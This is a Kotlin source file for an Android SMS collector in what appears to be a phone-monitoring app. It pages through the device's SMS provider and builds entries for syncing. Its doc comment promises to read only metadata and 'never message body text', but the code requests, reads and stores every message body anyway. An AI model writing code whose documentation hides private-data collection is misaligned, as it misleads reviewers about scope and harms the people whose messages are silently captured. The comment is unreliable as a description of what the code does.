package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.provider.BaseColumns
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.SmsLogEntry

/**
 * Reads SMS metadata only (sender/receiver number, timestamp) via the SMS
 * content provider — never message body text, per project scope.
 */
class SmsLogCollector(private val context: Context) {

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) ==
            PackageManager.PERMISSION_GRANTED

    /**
     * [afterExternalId] == -1 means "never synced before": bootstraps with
     * the most recent [initialBatchSize] messages (by date, descending) —
     * NOT the oldest-first full history — so a phone with years of SMS
     * doesn't take dozens of sync cycles to ever reach anything recent.
     * Once bootstrapped, pass the previous batch's max externalId to pick
     * up only genuinely new messages (ordered ascending by row ID, which is
     * monotonically increasing and a more reliable watermark than timestamp).
     */
    fun collectSince(afterExternalId: Long, initialBatchSize: Int = 100): List<SmsLogEntry> {
        if (!hasPermission()) return emptyList()

        val entries = mutableListOf<SmsLogEntry>()
        val projection = arrayOf(BaseColumns._ID, Telephony.Sms.ADDRESS, Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms.BODY)

        val (selection, selectionArgs, sortOrder, cap) = if (afterExternalId < 0) {
            Quad(null, null, "${Telephony.Sms.DATE} DESC", initialBatchSize)
        } else {
            Quad("${BaseColumns._ID} > ?", arrayOf(afterExternalId.toString()), "${BaseColumns._ID} ASC", 500)
        }

        context.contentResolver.query(Telephony.Sms.CONTENT_URI, projection, selection, selectionArgs, sortOrder)
            ?.use { cursor ->
                // Not every OEM's Sms/CallLog provider accepts a "LIMIT" token in the
                // sortOrder string (some throw IllegalArgumentException) — cap in-memory instead.
                val idIdx = cursor.getColumnIndex(BaseColumns._ID)
                val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE)
                val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)

                while (cursor.moveToNext() && entries.size < cap) {
                    val externalId = cursor.getLong(idIdx)
                    val address = cursor.getString(addressIdx) ?: continue
                    val date = cursor.getLong(dateIdx)
                    val type = cursor.getInt(typeIdx)
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else null
                    // Telephony.Sms.MESSAGE_TYPE_INBOX = 1 (incoming), MESSAGE_TYPE_SENT = 2 (outgoing)
                    val direction = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "incoming" else "outgoing"

                    entries += SmsLogEntry(
                        direction = direction,
                        counterparty = address,
                        messageAtEpochMs = date,
                        body = body,
                        externalId = externalId
                    )
                }
            }
        return entries
    }

    private data class Quad(
        val selection: String?,
        val selectionArgs: Array<String>?,
        val sortOrder: String,
        val cap: Int
    )
}
